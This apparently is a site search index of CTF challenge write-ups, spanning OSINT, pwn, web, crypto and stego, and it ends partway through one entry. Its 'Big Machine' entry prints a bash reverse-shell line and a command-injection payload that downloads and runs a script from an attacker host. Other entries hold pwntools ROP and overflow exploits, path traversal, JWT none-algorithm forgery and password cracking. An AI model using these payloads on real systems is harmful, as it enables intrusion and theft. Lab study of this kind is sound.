[ { "title": "Around The World", "url": "/writeups/CyberConverge_2025/01-around-the-world.html", "categories": "OSINT", "tags": "", "date": "", "snippet": "Around the World Author: Aakansh Gupta (Unknown)This is a purley OSINT based CTF. Use tools like Google lens or Google EarthSince we know the flag starts with CBCV{XXXX} format, we try an search i...", "content": "Around the World Author: Aakansh Gupta (Unknown)This is a purley OSINT based CTF. Use tools like Google lens or Google EarthSince we know the flag starts with CBCV{XXXX} format, we try an search it.Image was taken from Google Earth: https://earth.google.com/web/@48.24320818,17.6841851,122.62258148a,0d,90y,113.92109797h,93.75353085t,0r/data=CgRCAggBIhoKFmEzZENqNGtRN3Y5TDJuMVhpR2NjTFEQAjoDCgEwQgIIAEoICJvNmbsHEAAThe flag would be:CBCV{trnava_slovakia}" }, { "title": "Door's Mechanism", "url": "/writeups/FinalTrace_2025/01-doors-mechanism.html", "categories": "Pwn", "tags": "", "date": "", "snippet": "Door’s Mechanism Author: Naresh Category: Pwn Challenge Description Legends speak of a single spell that can unseal the ancient chamber. With one utterance, perform the invocation and witne...", "content": "Door’s Mechanism Author: Naresh Category: Pwn Challenge Description Legends speak of a single spell that can unseal the ancient chamber. With one utterance, perform the invocation and witness what was meant to stay hidden.SolutionInitial AnalysisFirst, run file on the binary (Last-Invocation) to confirm it is a 64-bit ELF.$ file Last-InvocationLast-Invocation: ELF 64-bit LSB executable, ...Next, run checksec to see what protections were enabled.$ checksec Last-Invocation[*] 'Last-Invocation' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments No PIE indicates that the function addresses will be static.Running the binary and giving it a long string of ‘A’s causes a Segmentation fault, confirming the buffer overflow.Tools Used pwntools: For building and sending the exploit payload. gdb (with pwndbg): For finding the offset and function addresses. Ghidra: For static analysis and decompilation. ropper: For finding the ROP gadgets. checksec: For checking binary protections. Step-by-Step Solution Step 1: Finding the Vulnerability and Offset Open the binary in GDB (with pwndbg) and use a cyclic(100) pattern to find the exact offset to control the return address. gdb-pwndbg&gt; r...Speak the Invocation:aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa...Program received signal SIGSEGV, Segmentation fault.... gdb-pwndbg&gt; cyclic -l daaaaaaa24 The offset to overwrite the return address is 24 bytes. Step 2: Planning the ROP Chain The goal is to return to the unseal_chamber function, which will print the flag. This function can be easily found by decompiling the binary in Ghidra or by using gdb. To call it successfully, it requires two specific 64-bit integers as arguments: $rdi(first argument) = 0xdeadc0dedeadc0de $rsi (second argument) = 0xc05c0377c05c0377Use ropper to find the necessary ROP gadgets:$ ropper --file Last-Invocation --search \"pop rdi; ret\"...0x000000000040119a: pop rdi; ret; $ ropper --file Last-Invocation --search \"pop rsi; pop r15; ret\"...0x000000000040119c: pop rsi; pop r15; ret;Use gdb to find the function address.gdb-pwndbg&gt; p unseal_chamber$1 = (void (long, long)) 0x4011a3 &lt;unseal_chamber&gt;The final ROP chain should look like this: Padding: 24 bytes of junk (to fill the buffer) Gadget 1: Address of pop rdi; ret Argument 1: 0xdeadc0dedeadc0de Gadget 2: Address of pop rsi; pop r15; ret Argument 2: 0xc05c0377c05c0377 Argument 3: 8 bytes of junk (for pop r15) Target: Address of unseal_chamberStep 3: Final Exploit ScriptWrite a final exploit script using pwntools to automate this process.from pwn import *offset = 24pop_rdi = 0x000000000040119apop_rsi_r15 = 0x000000000040119cparam1 = 0xdeadc0dedeadc0deparam2 = 0xc05c0377c05c0377unseal_chamber = 0x00000000004011a3p = remote(\"target_host\", PORT)payload = b'A'*offset + p64(pop_rdi) + p64(param1) + p64(pop_rsi_r15) + p64(param2) + p64(0x00000000) + p64(unseal_chamber)p.recvline()p.sendline(payload)p.interactive()Running this script against the binary will call the function with the correct arguments and print the flag.Flag CYS{7h3l45t_1nv0ca710n_ha5_b33n_5p0k3n@789#!}" }, { "title": "Big Machine", "url": "/writeups/CyberConverge_2025/02-Big-machine.html", "categories": "Pwn", "tags": "", "date": "", "snippet": "Big Machine Author: Aakansh Gupta (Unknown)Check the website on the given urlIt shows the pin result for given IPs.Try and get a reverse shell on it.Since most common commands are blocked, we try ...", "content": "Big Machine Author: Aakansh Gupta (Unknown)Check the website on the given urlIt shows the pin result for given IPs.Try and get a reverse shell on it.Since most common commands are blocked, we try and send a script from attacked to the machine like:#!/bin/bashbash -i &gt;&amp; /dev/tcp/192.168.192.130/4444 0&gt;&amp;1We craft a special request to send this: ` 8.8.8.8;curl${IFS}-o${IFS}/tmp/x${IFS}YOUR_ATTACKER_IP:8000/s;chmod${IFS}+x${IFS}/tmp/x;/tmp/x `We can use python http.server to send the file. At the same time keep the netcat listener open to accept the reverse shell.After getting a reverse shell, try snoop around to find the flag. If you check the enviornment variables using env , you get the flagThe flag found is:CBCV{3nv1r0nm3nt_v4r14bl3s_c4n_b3_s3cr3t_2352}" }, { "title": "Echo in Black & White", "url": "/writeups/FinalTrace_2025/02-echo-in-black-white.html", "categories": "Forensics", "tags": "", "date": "", "snippet": "Echo in Black &amp; WhiteChallenge Information Title: Echo in Black &amp; White Category: Forensics Difficulty: Easy–MediumChallenge DescriptionWhat if complexity is just an illusion? Sometimes,...", "content": "Echo in Black &amp; WhiteChallenge Information Title: Echo in Black &amp; White Category: Forensics Difficulty: Easy–MediumChallenge DescriptionWhat if complexity is just an illusion? Sometimes, the most ordinary patterns hold extraordinary secrets — if you learn to see them differently.The challenge is about observing the given image carefully — it may look random, but it hides a binary pattern where black represents 1 and white represents 0.Instead of overcomplicating it, try to read the pattern as bits, group them properly, and see what message it reveals.Sometimes, the simplest patterns lead you straight to the flag.Hintthe grid is 16*10 bitsSolutionInitial AnalysisThe challenge image looked like a small QR-like binary grid.Since the description mentioned interpreting colors as binary bits, the first idea was to treat each black pixel as 1 and each white pixel as 0, then group them to extract ASCII text.Tools Used Python Pillow (PIL) – for reading and resizing the image NumPy – for pixel manipulationStep-by-Step SolutionStep 1: Load and Convert the Imagefrom PIL import Imageimport numpy as npimg = Image.open(\"download.png\").convert(\"L\")binary_img = (np.array(img) &lt; 128).astype(np.uint8) # Black = 1, White = 0This converts the image to grayscale, then thresholds it so that each pixel is either 1 or 0.Step 2: Resize to Match the Hint Dimensionsresized = np.array(Image.fromarray(binary_img * 255).resize((16, 10), Image.NEAREST))resized = (resized &gt; 128).astype(np.uint8)According to the challenge hint, the grid has 16 columns and 10 rows, so we resize it to that exact shape.Step 3: Extract Binary and Convert to ASCIIascii_text = \"\"for row in resized: bits = \"\".join(map(str, row)) byte1, byte2 = bits[:8], bits[8:] ascii_text += chr(int(byte1, 2)) + chr(int(byte2, 2))print(ascii_text)Each row gives 16 bits (2 ASCII characters of 8 bits each).After converting the binary values to text, the decoded message appears as:CYS{7H3_H1DD3N_L4Y3R}FlagCYS{7H3_H1DD3N_L4Y3R}Lessons Learned Binary-encoded patterns in images can directly store ASCII text. Always check for pixel-level hints in Forensics challenges. Knowing how to manipulate images programmatically is very useful in CTFs.Resources Binary to ASCII Conversion Reference" }, { "title": "Breach", "url": "/writeups/CyberConverge_2025/03-breach.html", "categories": "Misc", "tags": "", "date": "", "snippet": "Breach Author: Harsh Singh (DeadStar)Using steghide we can get the hidden file in the image.POPI{S14TVfUrer}The Actual aftering decoding it with rot13 cipher isFlag Reterived is:CBCV{F14GIsHere}", "content": "Breach Author: Harsh Singh (DeadStar)Using steghide we can get the hidden file in the image.POPI{S14TVfUrer}The Actual aftering decoding it with rot13 cipher isFlag Reterived is:CBCV{F14GIsHere}" }, { "title": "Do you know XOR well enough?", "url": "/writeups/FinalTrace_2025/03-do-you-know-xor-well-enough.html", "categories": "General", "tags": "", "date": "", "snippet": "Do you know XOR well enough? Category: Cryptography Author: P C GuhanDescription Random numbers, AES encryption, SHA 256, HMAC, constant-time hash checking… what more do you want?All are importe...", "content": "Do you know XOR well enough? Category: Cryptography Author: P C GuhanDescription Random numbers, AES encryption, SHA 256, HMAC, constant-time hash checking… what more do you want?All are imported functions, hence highly secureOr is it??SolutionThis method uses the previous block to encrypt the next block. The same follows for decryption also. Hence, a bit flip will alter the plaintext.Each hex requires two characters. The length of “admin=0” is 7. The hex output consists of the 16 bit IV and the 16 bit padded ciphertext. The IV is XOred with the decrypted ciphertext.To get admin=1, we XOR the 6th character block with 1.i.e. IV[6] ^ decrypted(message[6]) ^ 1 = 0 ^ 1since 0 ^ 1 = 1,IV[6] ^ decrypted(message[6]) ^ 1 = 1giving us admin=1A corresponding hash can be generated as the hashing algorithm is open source.To mitigate this vulnerability while still using AES CBC mode, AEAD (Authenticated Encryption and Additional Data) must be used i.e. hashing with a secret key.Scriptfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import pad, unpadfrom Crypto.Random import get_random_bytesimport hashlibimport hmacimport random# --- setup (same as challenge) ---key = get_random_bytes(16)iv = get_random_bytes(16)part1 = \"AES\"part2 = ''.join(random.choices(string.ascii_uppercase, k=5))part3 = \"AEAD\"part4 = f\"{random.randint(0, 999999):06d}\"part5 = ''.join(random.choices(string.ascii_uppercase, k=3))flag = \"CYS{\" + f\"{part1}_{part2}_{part3}_{part4}_{part5}\" + \"}\"def encrypt_data(data): cipher = AES.new(key, AES.MODE_CBC, iv) enc = cipher.encrypt(pad(data.encode(), 16, style='pkcs7')) return enc.hex()def decrypt_data(encryptedParams): data = bytes.fromhex(encryptedParams) if len(data) &lt; 16: raise ValueError(\"Ciphertext too short\") iv_in = data[:16] ciphertext = data[16:] cipher = AES.new(key, AES.MODE_CBC, iv_in) paddedParams = cipher.decrypt(ciphertext) plaintext = unpad(paddedParams, 16, style='pkcs7') return plaintext.decode(errors='ignore')print(\"Just copy and paste? Hash is also given...\")msg = \"admin=0\"print(\"\\nCurrent authentication message is : \" + msg)print(\"Turn it to admin=1\")cipher_hex = encrypt_data(msg)iv_cipher = iv.hex() + cipher_hexprint(\"\\nEncryption of authentication message in hex : \" + iv_cipher)hashed_value = hashlib.sha256(iv_cipher.encode('utf-8')).hexdigest()print(\"SHA-256: \", hashed_value)# -----------------------------# Solution# Reliable CBC bit-flip to change admin=0 -&gt; admin=1# -----------------------------orig_msg = \"admin=0\"target_msg = \"admin=1\"p0 = pad(orig_msg.encode(), 16, style='pkcs7')[:16]p1 = pad(target_msg.encode(), 16, style='pkcs7')[:16]delta = bytes(a ^ b for a, b in zip(p0, p1))iv_prime = bytes(a ^ b for a, b in zip(iv, delta))enc_msg = iv_prime.hex() + cipher_hexenc_hash = hashlib.sha256(enc_msg.encode('utf-8')).hexdigest()# --- setup (same as challenge) ---try: if hmac.compare_digest(hashlib.sha256(enc_msg.encode('utf-8')).hexdigest(), enc_hash): final_dec_msg = decrypt_data(enc_msg) print(final_dec_msg) if \"admin=1\" == final_dec_msg: print(flag) else: print('\\nTry again you can do it!!') else: print(\"\\nHashing failed\") print(hashlib.sha256(enc_msg.encode('utf-8')).hexdigest() + \"\\n\\n\") print(enc_hash)except Exception as e: print('\\nbye bye!!', e)" }, { "title": "Cathedral", "url": "/writeups/CyberConverge_2025/04-Cathedral.html", "categories": "OSINT", "tags": "", "date": "", "snippet": "The CathedralA quick Google Image Search reveals the location: Notre Dame Cathedral, Nuku Hiva, French Polynesia.From there, we head over to Google Earth (or Google Maps), locate the site, and swit...", "content": "The CathedralA quick Google Image Search reveals the location: Notre Dame Cathedral, Nuku Hiva, French Polynesia.From there, we head over to Google Earth (or Google Maps), locate the site, and switch to Street View. The exact coordinates can be extracted directly from the URL in the browser.The flag found is:CBCV{-8.9103_-140.1026} OR CBCV{-8.9103_-140.1030}" }, { "title": "Alpha Parallel", "url": "/writeups/FinalTrace_2025/04-alpha-parallel.html", "categories": "Forensics / Cryptography", "tags": "", "date": "", "snippet": "Alpha ParallelChallenge Information Field Details Title Alpha Parallel Category Forensics / Cryptography Difficulty Easy ...", "content": "Alpha ParallelChallenge Information Field Details Title Alpha Parallel Category Forensics / Cryptography Difficulty Easy Points 150 Challenge DescriptionThe provided PNG image contained two QR codes — one clearly visible, and another hidden within the alpha channel (transparency layer).When extracted, the visible QR directed players to a YouTube video, while the hidden QR led to a Pastebin URL containing a Spiral Cipher challenge.The player’s goal was to uncover the hidden data layer, decode the spiral cipher, and retrieve the final flag.Step 1: Inspecting the PNG LayersOpening the image in a standard viewer only showed one QR code.However, using a forensic image inspection tool like GIMP, StegSolve, or Python (Pillow) revealed that the alpha channel contained distinct pixel patterns — forming a second QR code.Extract Alpha Channel Using Pythonfrom PIL import Image# Load imageimg = Image.open(\"dual_qr.png\")# Split image into channels (RGBA)r, g, b, a = img.split()# Save the alpha channel separatelya.save(\"hidden_qr.png\")print(\"Hidden QR extracted as hidden_qr.png\")This script isolates the transparency layer (alpha) and saves it as a new image — hidden_qr.png — which can then be scanned.Step 2: Scanning Both QR CodesAfter extraction: Visible QR: Scanned to https://www.youtube.com/watch?v=dQw4w9WgXcQ Hidden QR: Scanned to a Pastebin URLhttps://pastebin.com/ZmkMxUdYThe Pastebin text displayed a 5×5 grid, which was actually a Spiral Cipher.Step 3: Understanding the Spiral CipherPastebin content:X P H A _2 L H A Q4 A S D R_ _ W O _R E Y A LThe challenge description hinted: “Outward, start by up, clockwise.”This means we must read the characters from the center outward, following a clockwise spiral starting upward.Step 4: Solving the Spiral Cipher in PythonTo automate decoding, we can write a small script:def spiral_read(matrix): n = len(matrix) x, y = n // 2, n // 2 # start from center dx, dy = 0, -1 # start moving up result = [] steps = 1 while len(result) &lt; n * n: for _ in range(2): # two directions before increasing step size for _ in range(steps): if 0 &lt;= x &lt; n and 0 &lt;= y &lt; n and matrix[y][x] != '_': result.append(matrix[y][x]) x, y = x + dx, y + dy dx, dy = dy, -dx # rotate 90° clockwise steps += 1 return ''.join(result)grid = [ ['X','P','H','A','_'], ['2','L','H','A','Q'], ['4','A','S','D','R'], ['_','_','W','O','_'], ['R','E','Y','A','L']]flag = spiral_read(grid)print(\"Decoded Spiral:\", flag)Output:Decoded Spiral: CYS{SHADOW_ALPHA_QR_LAYER_42X}Final FlagCYS{SHADOW_ALPHA_QR_LAYER_42X}" }, { "title": "Easy Flag", "url": "/writeups/CyberConverge_2025/05-easy-file.html", "categories": "Web", "tags": "", "date": "", "snippet": "Easy Flag Author: Aakansh Gupta (Unknown)A simple web base path traversal vulnerability.Clicking on any on the links leads to a url like: http://20.244.12.130:50002/view?file=db_errors.logJust try...", "content": "Easy Flag Author: Aakansh Gupta (Unknown)A simple web base path traversal vulnerability.Clicking on any on the links leads to a url like: http://20.244.12.130:50002/view?file=db_errors.logJust try and change the view?file=db_errors.log to common paths like ../app.py or ../flag.txtVisiting http://20.244.12.130:50002/view?file=../flag.txt give:A string of hex numbers: ` 57 56 57 50 7b 6a 34 6e 42 5f 6e 6c 34 70 33 6c 6d 34 46 5f 70 38 66 48 5f 39 33 39 38 35 31 7d `Using CyberChef we can decode these to WVWP{j4nB_nl4p3lm4F_p8fH_939851}Using a ROT6 cypher we get: CBCV{p4tH_tr4v3rs4L_v8lN_939851}The flag found is:CBCV{p4tH_tr4v3rs4L_v8lN_939851}" }, { "title": "The Door's Mechanism", "url": "/writeups/FinalTrace_2025/05-the-doors-mechanism.html", "categories": "pwn", "tags": "", "date": "", "snippet": "The Door’s MechanismChallenge Information Title: The Door’s Mechanism Category: pwn Difficulty: Easy Points: [Point Value]Challenge DescriptionWe are given a 32-bit ELF binary named vuln. The g...", "content": "The Door’s MechanismChallenge Information Title: The Door’s Mechanism Category: pwn Difficulty: Easy Points: [Point Value]Challenge DescriptionWe are given a 32-bit ELF binary named vuln. The goal is to provide the correct input to get the flag.SolutionInitial AnalysisFirst run file and checksec on the binary to see what we are dealing with.$ file vulnvuln: ELF 32-bit LSB executable, Intel 80386, ... not stripped$ checksec vuln[*] 'vuln' Arch: i386-32-bit-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000)The binary is a 32-bit executable with no security protections. This strongly suggests a classic stack-based exploit.Running the binary, it asks for input:$ ./vulnEnter the code: testAccess denied.Analyzing the decompiled code in ghidra, we can spot the vulnerability in the input() function.The gets(buffer) call reads input into a 32-byte buffer without any size limit, creating a stack buffer overflow.The solution is to use the buffer overflow from gets(buffer) to overwrite the adjacent key variable on the stack with the value 0x0defaced.Tools Used pwntools Ghidra checksecStep-by-Step SolutionStep 1: Determine Stack Layout and Offsetgets() writes up the stack (towards higher addresses), when we overflow the 32-byte buffer, the very next 4 bytes we send will overwrite the memory allocated for the key variable.Therefore, our offset is 32 bytes.Step 2: Craft the PayloadWe need to send: 32 bytes of “junk” padding to fill the buffer. The 4-byte value 0x0defaced to overwrite key.Our final payload will be: [32 bytes of 'A'] + [0x0defaced]Step 3: Write the Exploitfrom pwn import *key_value = p32(0x0defaced)padding = b'A' * 32payload = padding + key_value#p = process('./vuln')p = remote(\"target_host\",PORT)print(f\"Sending payload: {payload}\")p.sendline(payload)print(p.recvall().decode())Running this pwntools python script give you the flag.FlagCYS{pwn!@#$\\_overflow\\_#}" }, { "title": "Hidden Layers", "url": "/writeups/CyberConverge_2025/06-Hidden-Layers.html", "categories": "steganography", "tags": "", "date": "", "snippet": "Hidden Layers Author: AmarnathInitial Steps Find Morse code. Convert to Base32. Apply ROT13. Remove EVEN Postion Alphabets.Further Solving and Steps# Step 1: USE Morse decoder&lt;img src=\"./im...", "content": "Hidden Layers Author: AmarnathInitial Steps Find Morse code. Convert to Base32. Apply ROT13. Remove EVEN Postion Alphabets.Further Solving and Steps# Step 1: USE Morse decoder&lt;img src=\"./images/morsedecoded1.png\" /&gt;# Step 2 &amp; 3: Base32 decode and ROT13&lt;img src=\"./images/from32baseandrot13.png\" /&gt;# Step 4:Remove Alphabets from EVEN PostionACBBCCDVE{FCGRHYIPJTK_LCM4NNO_PBQ3R_SLT4UYV3WRX5Y}ZFinal Flag reterived is:CBCV{CRYPT_C4N_B3_L4Y3R5}" }, { "title": "AES again??", "url": "/writeups/FinalTrace_2025/06-aes-again.html", "categories": "General", "tags": "", "date": "", "snippet": "AES again?? Category: Cryptography Author: P C GuhanDescription ECB mode this time…Random function, PKCS 7 padding - should be goodOr is it??(Encode the flag as CYS{flag} separated by underscore...", "content": "AES again?? Category: Cryptography Author: P C GuhanDescription ECB mode this time…Random function, PKCS 7 padding - should be goodOr is it??(Encode the flag as CYS{flag} separated by underscores)Sourcefrom Crypto.Cipher import AESfrom Crypto.Util.Padding import padimport randomrandom_int = random.getrandbits(128)key = random_int.to_bytes(16, byteorder='big')cipher = AES.new(key, AES.MODE_ECB)def encrypt(str): padded = pad(str.encode(), 16) encrypted = cipher.encrypt(padded) return encryptedwith open(\"flag.txt\", \"r\") as f: plaintext = f.read()encrypted_blocks = [encrypt(c).hex() for c in plaintext]with open(\"output.txt\", \"w\") as f: f.write(\" \".join(encrypted_blocks))output.txtSolutionAES ECB mode uses the same key to encrypt different blocks.The vulnerability in this code is that we take a single character from the flag, pad it and encrypt it as opposed to padding the entire flag and encrypting it.Therefore all instances of the same character have the same cipher i.e. all ‘a’s will have the same cipher.This in turn can be broken through frequency analysisFrequency analysis also becomes easier when a large amount of text is givenSolution scriptimport stringdef read_encrypted(filename): with open(filename, \"r\") as f: content = f.read() return content.strip().split()def map_blocks_to_letters(encrypted_blocks): unique_blocks = sorted(set(encrypted_blocks)) if len(unique_blocks) &gt; 26: raise ValueError(f\"Too many unique blocks: {len(unique_blocks)} (max 26 allowed)\") letters = list(string.ascii_lowercase) mapping = {block: letter for block, letter in zip(unique_blocks, letters)} return mappingdef substitute_blocks_with_letters(encrypted_blocks, mapping): return \"\".join(mapping.get(block, \"?\") for block in encrypted_blocks)def main(): encrypted_file = \"output.txt\" decoded_file = \"test.txt\" encrypted_blocks = read_encrypted(encrypted_file) mapping = map_blocks_to_letters(encrypted_blocks) decoded_text = substitute_blocks_with_letters(encrypted_blocks, mapping) with open(decoded_file, \"w\") as f: f.write(decoded_text)if __name__ == \"__main__\": main()test.txtThis script substitutes each unique hex value with a letter. There are only 26 unique hex values in output.txtWhen doing frequency analysis and substitution on the contents of test.txt, we get the plaintext.Frequency analysis tools are available online.The tool I used Flag: CYS{tiny_change_huge_difference}" }, { "title": "VAULT_7A", "url": "/writeups/FinalTrace_2025/07-output-temporal.html", "categories": "General", "tags": "", "date": "", "snippet": "Challenge Name: VAULT_7ACategory: Forensics / SteganographyAuthor: Vishal VDifficulty: EasyChallenge DescriptionWithin the Echo Maze, you discover a flickering hologram capsule labeled “VAULT_7A”. ...", "content": "Challenge Name: VAULT_7ACategory: Forensics / SteganographyAuthor: Vishal VDifficulty: EasyChallenge DescriptionWithin the Echo Maze, you discover a flickering hologram capsule labeled “VAULT_7A”. The projection stutters between timeframes, overlaying multiple moments into a single distorted image.Lyra’s voice echoes: “Some memories hide in layers… peel them back carefully.”Downloads:temporal_fragment.jpghint.txtSolution:Initial AnalysisUpon downloading the challenge files, I was presented with:A JPEG image file (temporal_fragment.jpg)A hint file (hint.txt)First, I examined the basic file properties:bash: file temporal_fragment.jpgOutput:temporal_fragment.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 360x360, components 3No immediate clue was found. From challenge description “…peel them back…” , we can infer it must be something related to steganography.Tools Used:steghide - JPEG/BMP steganography toolbase64 - Base64 decoder (built-in Linux/Mac command)zbarimg - QR code scanner (from zbar-tools package)Online Caesar cipher decoder (or manual decoding)Online QR scanner (https://webqr.com) as alternativeStep-by-Step SolutionStep 1: Decode the Passphrase from hint.txtReading the hint file revealed an encoded passphrase:bash: cat hint.txtKey information found: Encoded passphrase: ALTWVYHS Hint: “Time shifts all things forward. To find truth, shift backwards 7 times.” Encryption method: TEMPORAL SHIFT PROTOCOL (Caesar/ROT cipher)The hint indicates a Caesar cipher with shift of 7. To decrypt, I needed to shift each letter backward by 7 positions in the alphabet.Manual decoding:A - 7 = TL - 7 = ET - 7 = MW - 7 = PV - 7 = OY - 7 = RH - 7 = AS - 7 = LResult: TEMPORALAlternatively, using an online ROT decoder or Python:Python code: def rot_decode(text, shift): result = “” for char in text: if char.isalpha(): start = ord(‘A’) if char.isupper() else ord(‘a’) result += chr((ord(char) - start - shift) % 26 + start) else: result += char return resultprint(rot_decode(“ALTWVYHS”, 7))Output: TEMPORALPassphrase obtained: temporalStep 2: Check for any hidden images inside the given image: bash: steghide info temporal_fragment.jpg Output: steghide info temporal_fragment.jpg“temporal_fragment.jpg”: format: jpeg capacity: 634.0 ByteTry to get information about embedded data ? (y/n) yEnter passphrase: embedded file “qr_secret.png”: size: 481.0 Byte encrypted: rijndael-128, cbc compressed: yesFound a embedded file qr_secret.png!!Step 3: Extract Hidden Data Using SteghideWith the passphrase decoded, I used steghide to extract hidden data from the image:bash: steghide extract -sf temporal_fragment.jpg -p “temporal”Output:wrote extracted data to “qr_secret.png”Success! The steghide tool extracted a hidden PNG file.Step 4: Decode the QR CodeUsing zbarimg to scan the QR code:bash: zbarimg qr_secret.png```Output:QR-Code:RkxBR3tFQ0hPX1ZBVUVUX01FTU9SWV9GUkFHTUVOVF83QV9SRVNUT1JFRH0=The QR code contained a base64-encoded string.OR use a online qr decoder.Step 5: Decode Base64 StringThe QR output was clearly base64 (ending with = padding). Decoding it:bash: echo “RkxBR3tFQ0hPX1ZBVUVUX01FTU9SWV9GUkFHTUVOVF83QV9SRVNUT1JFRH0=” | base64 -dOutput: FLAG{ECHO_VAULT_MEMORY_FRAGMENT_7A_RESTORED}Alternative Solution PathsWithout Knowing the PasswordIf the passphrase wasn’t decoded, players could use stegseek to brute-force it:bash# Install stegseeksudo apt-get install stegseekCrack with common wordliststegseek temporal_fragment.jpg /usr/share/wordlists/rockyou.txtThis would find “temporal” in seconds since it’s a common word.Using Online ToolsFor players without CLI tools:Use online Caesar decoder: https://cryptii.com/pipes/caesar-cipherExtract with steghide (requires installation)Use online QR scanner: https://webqr.comUse online base64 decoder: https://www.base64decode.org" }, { "title": "Who am I?", "url": "/writeups/CyberConverge_2025/07-whoamii.html", "categories": "Web", "tags": "", "date": "", "snippet": "Who am I? Author: Aakansh Gupta (Unknown)Simple JWT based ctf.Visit the given url and look for the cookie user .Decode it using tools like www.jwt.ioIt give the flag as \"sub\":\"CBCV{jWt_t0k3ns_us3...", "content": "Who am I? Author: Aakansh Gupta (Unknown)Simple JWT based ctf.Visit the given url and look for the cookie user .Decode it using tools like www.jwt.ioIt give the flag as \"sub\":\"CBCV{jWt_t0k3ns_us3d_34}\" The flag found is:CBCV{jWt_t0k3ns_us3d_34}" }, { "title": "Forged Memory Log", "url": "/writeups/FinalTrace_2025/08-forged-memory-log.html", "categories": "General", "tags": "", "date": "", "snippet": "Forged Memory Log Category: Cryptography Author: P C GuhanDescription Inside the Hourglass Citadel, Lyra uncovers a crystalline data shard said to contain the key to the final confession. But th...", "content": "Forged Memory Log Category: Cryptography Author: P C GuhanDescription Inside the Hourglass Citadel, Lyra uncovers a crystalline data shard said to contain the key to the final confession. But the key has been forged and obfuscated — mirrored fragments, deliberate noise, and counterfeit characters woven into its structure to mimic authenticity. Every attempt to read it only reveals more copies of itself, each slightly altered. To move forward, the player must isolate the genuine cipher sequence hidden beneath layers of forged keys and false reflections.SolutionBrute force base-32 decode 39 times(I was limited to 39 as python had a memory error after 39 and I was lazy to do it in C/C++)import base64with open(\"output.txt\", \"r\") as f: inp = f.read()inp = inp.encode('ascii')inp = inp[2:-1]for i in range(39): inp = base64.b32decode(inp) print(i)print(inp) Flag: CYS{brute_forcing_is_the_way}" }, { "title": "I am Who?", "url": "/writeups/CyberConverge_2025/08-i_am_who.html", "categories": "Web", "tags": "", "date": "", "snippet": "I am Who? Author: Aakansh Gupta (Unknown)A longer version of it’s parent CTF who am i . This requires none Algorithm attack and secret key verification.Visit the given page and check the cookie.Th...", "content": "I am Who? Author: Aakansh Gupta (Unknown)A longer version of it’s parent CTF who am i . This requires none Algorithm attack and secret key verification.Visit the given page and check the cookie.This time we have an admin page.This requires elevated privilages.Use jwt.io to encode a cookie without any algorithm to bypass auth.This allows access to admin panel. But this isnt the end, we reqire another endpoint finalcheckAnd a new role called superadmin is needed.We can brute force common secret keys like secret or qwerty (in this case its qwerty).Using jwt.io we craft a cookie and send it.Now we can access the /finalcheck endpoint and see the flag.The flag found is:CBCV{w34K_S3Cr3T_K3y_Cr4CK3d_835}" }, { "title": "Intellectual Conversation", "url": "/writeups/CyberConverge_2025/09-inti-conv.html", "categories": "Misc", "tags": "", "date": "", "snippet": "Intellectual Conversation Author: AadhyanthEncoding:convert each character to ascii and insert \\u200b after that many charactersDecoding:find distance between 2 zero-width characters and convert t...", "content": "Intellectual Conversation Author: AadhyanthEncoding:convert each character to ascii and insert \\u200b after that many charactersDecoding:find distance between 2 zero-width characters and convert take chr()python code:def hide_flag_in_text(text, flag): zwsp = \"\\u200b\" result = \"\" flag_index = 0 char_count = 0 for ch in text: result += ch char_count += 1 # check if we've reached the ascii value position for current flag character if flag_index &lt; len(flag) and char_count == ord(flag[flag_index]): result += zwsp flag_index += 1 char_count = 0 # reset counter return resultdef decode_flag_from_text(encoded_text): char_count = 0 flag = \"\" for ch in encoded_text: if ch == '\\u200b': flag += chr(char_count) char_count = 0 else: char_count += 1 return flag# Usagehuge_text = \"\"\"TRANSCRIPT-1Discussion between Dr. Sarah Chen (Theoretical Physicist) and Prof. Marcus Rodriguez (Materials Science)......Prof. Rodriguez: Thank you, Sarah. I look forward to continuing this conversation as the field evolves.[End of Transcript]\"\"\"flag = \"CBCV{1nv151b1l1ty_0r_t1m3_c0ntr0l?}\"encoded_text = hide_flag_in_text(huge_text, flag)print(\"Encoded text:\")print(encoded_text)with open('transcript.txt', 'w', encoding='utf-8') as file: file.write(encoded_text) file.close()with open('transcript.txt', 'r', encoding = 'utf-8') as file: data = file.read() print(\"\\nDecoded flag:\") print(decode_flag_from_text(data))Output:Encoded text:Squeezed text (182 lines).The flag found is:CBCV{1nv151b1l1ty_0r_t1m3_c0ntr0l?}" }, { "title": "Reflection Restored", "url": "/writeups/FinalTrace_2025/09-reflection-restored.html", "categories": "General", "tags": "", "date": "", "snippet": "Reflection RestoredCategory: Reverse Engineering, ForensicsAuthor: SharonDescriptionThe binary repair asks for an input. If the input matches a criteria, a passphrase is printed. This passphrase is...", "content": "Reflection RestoredCategory: Reverse Engineering, ForensicsAuthor: SharonDescriptionThe binary repair asks for an input. If the input matches a criteria, a passphrase is printed. This passphrase is the steg info for repair_mirror.jpg attached. Inside repair_mirror.jpg is a text file that was embedded using steghide. The player needs to reverse repair to get the passphrase.SolutionInitial AnalysisRun the binary; it prompts for a key. Analyse the binary statically using a reverse-engineering tool like Ghidra.Step-by-step solutionStep 1: Statically analysing the binaryUpon opening the binary for static analysis, we notice the core functions and find the main function. In the decompile, we notice: iVar2 = valid_input(local_128); if (iVar2 == 0) { puts(\"Wrong.\"); }iVar2 checks a function called valid_input.We need to escape this by giving a valid input. Now let’s analyse what a valid input is: sVar3 = strlen((char *)param_1); bVar2 = false; if ((int)sVar3 == 0xc) { ppuVar4 = __ctype_b_loc(); pbVar1 = param_1 + 0xc; iVar6 = 0; iVar5 = 0; do { iVar5 = (iVar5 + 1) - (uint)(((*ppuVar4)[*param_1] &amp; 0x100) == 0); iVar6 = (iVar6 + 1) - (uint)(((*ppuVar4)[*param_1] &amp; 0x200) == 0); param_1 = param_1 + 1; } while (pbVar1 != param_1); bVar2 = 1 &lt; iVar5 &amp;&amp; 1 &lt; iVar6; } return bVar2;In the first few lines we notice that the input needs to be 12 characters long.The function then loops over each byte in the input, counting how many uppercase (0x100) and lowercase (0x200) characters it contains. It only validates the input if there are more than two uppercase and more than two lowercase alphabets.Step 2: Running the binaryNow we try 